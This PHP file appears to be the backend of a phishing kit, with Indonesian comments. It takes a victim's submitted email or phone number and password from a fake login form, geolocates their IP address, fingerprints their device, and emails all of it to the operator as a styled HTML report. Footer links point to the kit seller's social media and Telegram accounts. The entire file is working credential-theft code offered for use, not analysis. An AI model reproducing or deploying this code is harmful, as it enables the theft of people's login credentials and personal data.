<?php
include 'config/module.php';
include 'email.php';
date_default_timezone_set("Asia/Jakarta");
// INIT CONFIG
$sys = new Launch;

$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_POST['ip'];
$ua = $_POST['ua'];
$time = date('d-m-Y : h-i-s');
echo $user;
// FLAG
$info = $sys->location($ip);
$dev = $sys->devicemanager($ua);

$subjek = $info['flag'].' '.$info['code'].' | PUNYA '.$user;
$pesan = '
<center>
 <div style="background: url(https://i.postimg.cc/s2K04wYX/20211211-034205.jpg) no-repeat;border:2px solid pink;background-size: 100% 100%; width: 294; height: 101px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
    <tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Telpon</b></th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
</tr>

</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
ADDITIONAL INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Ip Address</th>
<th style="width: 65%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Country</th>
<th style="width: 65%; text-align: center;"><b>'.$info['country'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Flag</th>
<th style="width: 65%; text-align: center;"><b>'.$info['flag'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Region</th>
<th style="width: 65%; text-align: center;"><b>'.$info['region'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>City</th>
<th style="width: 65%; text-align: center;"><b>'.$info['city'].'</th> 
</tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Zip</th>
<th style="width: 65%; text-align: center;"><b>'.$info['zip'].'</th> 
</tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
DEVICE INFORMATION
</div>
<table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid pink; border-collapse:collapse;width:100%;background:#cf0485;">
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Device</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['device'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Browser</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['browser'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Os</th>
<th style="width: 65%; text-align: center;"><b>'.$dev['os'].'</th> 
</tr>
<tr>
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Date/Time</th>
<th style="width: 65%; text-align: center;"><b>'.$time.'</th> 
</tr>
<tr>
</table>
<div style="border:2px solid pink;width: 294; font-weight:bold; height: 20px; background: #cf0485; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3b5998;" href="https://www.facebook.com/nguyenxwann">𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="http://t.me/nguyenxstore">𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#25D366;" href="https://wa.me/6282324185540">𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙</a>
</div>
 <center>
';

$sender = 'From: ＥＯＳＰＲＡＳＳ© <smtpsendgrid691@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
// MENGIRIM DATA KE EMAIL
$sys->mail($email, $subjek, $pesan, $headers);
?>